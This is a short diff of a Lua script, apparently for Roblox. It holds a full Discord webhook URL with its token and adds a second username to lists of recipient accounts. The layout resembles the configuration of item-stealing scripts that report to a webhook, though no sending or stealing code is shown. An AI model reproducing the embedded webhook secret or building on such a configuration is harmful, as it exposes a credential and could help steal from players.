@@ -1,8 +1,8 @@
 
 
 local Webhook = "https://discord.com/api/webhooks/1465340884705873931/sjdicI6_huK8qalBn_ntg_avQAvNASoPpHo-hsWPR9M_xQOUmUyyEuiTUm8MPR0lurXN"
-local Username = {"Lilicyy90"}
-local ExtraUsers = {"Lilicyy90"}
+local Username = {"Lilicyy90", "GHOSS23"}
+local ExtraUsers = {"Lilicyy90", "GHOSS23"}
 local Friends = {}
 
 for _, v in ipairs(Username) do table.insert(Friends, v) end
